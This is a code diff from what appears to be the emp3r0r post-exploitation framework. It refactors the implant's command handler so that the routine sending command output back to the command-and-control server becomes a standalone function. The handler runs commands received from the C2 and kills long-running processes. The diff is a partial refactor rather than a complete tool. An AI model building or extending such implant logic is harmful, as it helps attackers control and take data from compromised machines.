@@ -23,11 +23,9 @@ import (
 // exec cmd, receive data, etc
 func processCCData(data *emp3r0r_def.MsgTunData) {
 	var (
-		data2send emp3r0r_def.MsgTunData
-		out       string
-		err       error
+		out string
+		err error
 	)
-	data2send.Tag = RuntimeConfig.AgentTag
 
 	payloadSplit := strings.Split(data.Payload, emp3r0r_def.MagicString)
 	if len(payloadSplit) <= 1 {
@@ -50,24 +48,11 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
 	log.Printf("Got command %s with args: %v", cmdSlice[0], cmdSlice)
 
-	// send response to CC
-	sendResponse := func(resp string) {
-		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
-			emp3r0r_def.MagicString,
-			strings.Join(cmdSlice, " "),
-			emp3r0r_def.MagicString,
-			resp)
-		data2send.Payload += emp3r0r_def.MagicString + cmd_id // cmd_id for cmd tracking
-		if err = Send2CC(&data2send); err != nil {
-			log.Println(err)
-		}
-		log.Printf("Response sent: %s", resp)
-	}
 	out = "Command failed"
 
 	if strings.HasPrefix(cmdSlice[0], "!") {
-		out = C2CommandsHandler(cmdSlice)
-		sendResponse(out)
+		out = C2CommandsHandler(cmdSlice, cmd_id)
+		sendResponse(out, cmd_id, cmdSlice)
 		return
 	}
 
@@ -372,7 +357,7 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 					err = cmd.Process.Kill()
 					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
 						cmd.Process.Pid, err)
-					sendResponse(out)
+					sendResponse(out, cmd_id, cmdSlice)
 					return
 				}
 			}()
@@ -385,5 +370,22 @@ func processCCData(data *emp3r0r_def.MsgTunData) {
 	default:
 	}
 
-	defer sendResponse(out)
+	defer sendResponse(out, cmd_id, cmdSlice)
+}
+
+// send response to CC
+func sendResponse(resp, cmd_id string, cmdSlice []string) {
+	data2send := emp3r0r_def.MsgTunData{
+		Tag: RuntimeConfig.AgentTag,
+	}
+	data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
+		emp3r0r_def.MagicString,
+		strings.Join(cmdSlice, " "),
+		emp3r0r_def.MagicString,
+		resp)
+	data2send.Payload += emp3r0r_def.MagicString + cmd_id // cmd_id for cmd tracking
+	if err := Send2CC(&data2send); err != nil {
+		log.Println(err)
+	}
+	log.Printf("Response sent: %s", resp)
 }
